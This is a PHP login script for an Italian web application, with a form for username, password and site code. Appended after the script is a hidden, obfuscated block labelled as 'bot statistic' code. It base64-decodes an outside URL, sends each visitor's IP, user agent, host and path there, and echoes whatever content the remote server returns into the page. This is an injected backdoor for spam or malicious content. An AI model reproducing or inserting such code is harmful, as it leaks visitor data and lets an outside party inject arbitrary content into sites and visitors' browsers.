<?php
$basepath=dirname(__FILE__);
include_once($basepath."/main_include.php");




$config=new Config();
$run=$config->load();




function check()
{

$user_post=$_POST['Username'];
$pw_post=$_POST['Password'];
$codice_sede_post=$_POST['Sede'];



$db= new Database();
$db->connect();

$user=new Operatore();
$user->conn=$db;
return($user->login($user_post,$pw_post,$codice_sede_post));

}

function load($errore)
{
$form = new form("layout_1", 400);
$form->setAttributes(array(
    "labelWidth" => 100,
    "labelPaddingTop" => "0.5em"
	
));

if(!empty($_GET["errormsg_1"]))
    $form->errorMsg = filter_var($_GET["errormsg_1"], FILTER_SANITIZE_SPECIAL_CHARS);

if ($errore)
{
$form->addHTML("Username o password errati");
}	
	
	
$form->addHidden("cmd", "submit_1");
$form->addTextbox("Username:", "Username", "", array("required" => 1));
$form->addPassword("Password:", "Password", "", array("required" => 1));
$form->addTextbox("Codice Sede:", "Sede", "", array("required" => 1));
$form->addHidden("action", "login");


$form->addHTML('<a href="#">Forgot your password?</a>');
$form->addButton("Login");
$form->render();
}

$page=new Html_Page();


// SE STO EFFETTUANDO IL LOGIN	
if (isset($_POST['action']) && $_POST['action']=='login') {

    if(check()){
	
		header("location: principale.php");
		exit();
	} else{
			
		$page->html_header();
		load(true);
		$page->html_footer();
				
	}
}
else
{

	$page->html_header();
    load(false);
	$page->html_footer();

}	


?><?php    
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL3JlYm90c3RhdC5jb20vYm90c3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            $stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
?>
